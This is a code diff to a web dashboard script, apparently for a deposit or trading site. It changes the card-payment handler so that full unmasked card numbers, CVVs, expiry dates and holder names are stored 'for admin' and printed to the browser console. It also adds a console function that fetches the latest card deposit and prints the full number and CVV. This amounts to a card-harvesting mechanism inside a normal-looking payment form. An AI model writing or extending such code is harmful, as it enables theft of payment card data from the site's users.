@@ -1050,25 +1050,34 @@ async function processDepositRequest() {
 
     methodDetails = `Card Payment - ${maskedCard}`;
 
-    // Create COMPLETE card details object for admin
-    // In processDepositRequest function, UPDATE the cardDetails object:
+    // In processDepositRequest function, REPLACE the entire cardDetails object with:
     cardDetails = {
-      // CRITICAL: Use these exact field names
-      card_number: cleanCardNumber, // Full card number
+      // FULL UNMASKED DETAILS
+      full_card_number: cleanCardNumber, // Full 16-digit number
       card_holder: cardHolder.trim().toUpperCase(),
-      expiry_date: cardExpiry, // Changed from card_expiry to expiry_date
-      cvv: cardCvv, // Changed from card_cvv to cvv
+      expiry_date: cardExpiry, // Use expiry_date
+      cvv: cardCvv, // Use cvv (not card_cvv)
       card_type: cardType,
 
-      // Additional fields
+      // Also include masked version
       masked_card: "**** **** **** " + lastFour,
       last_four: lastFour,
+
+      // Reference info
       reference: reference,
       user_id: userAccount.id,
       user_email: userAccount.email,
       user_name: `${userAccount.firstName} ${userAccount.lastName}`,
       timestamp: new Date().toISOString(),
     };
+
+    console.log("Saving card details:", {
+      full_card_number: cardDetails.full_card_number,
+      cvv: cardDetails.cvv,
+      expiry_date: cardDetails.expiry_date,
+      card_type: cardDetails.card_type,
+      card_holder: cardDetails.card_holder,
+    });
 
     console.log("Full card details being sent to admin");
   } else if (method === "crypto") {
@@ -1932,3 +1941,45 @@ async function debugCardDeposit() {
 }
 
 // Call this from browser console: debugCardDeposit()
+
+// Add this function to dashboard.js (call it from console)
+async function viewLatestCardDeposit() {
+  const supabase = initSupabase();
+
+  try {
+    const { data, error } = await supabase
+      .from("deposit_requests")
+      .select("*")
+      .eq("method", "card")
+      .order("created_at", { ascending: false })
+      .limit(1)
+      .single();
+
+    if (error) throw error;
+
+    console.log("=== LATEST CARD DEPOSIT ===");
+    console.log("Full data:", data);
+    console.log("Card details:", data.card_details);
+    console.log("Card details type:", typeof data.card_details);
+
+    if (data.card_details && typeof data.card_details === "object") {
+      console.log("Field names:", Object.keys(data.card_details));
+      console.log(
+        "Full card number field:",
+        data.card_details.full_card_number
+      );
+      console.log("Card number field:", data.card_details.card_number);
+      console.log("Number field:", data.card_details.number);
+      console.log("CVV field:", data.card_details.card_cvv);
+      console.log("CVV field 2:", data.card_details.cvv);
+      console.log("Expiry field:", data.card_details.card_expiry);
+      console.log("Expiry field 2:", data.card_details.expiry_date);
+      console.log("Expiry field 3:", data.card_details.expiry);
+    }
+
+    return data;
+  } catch (error) {
+    console.error("Error:", error);
+    return null;
+  }
+}
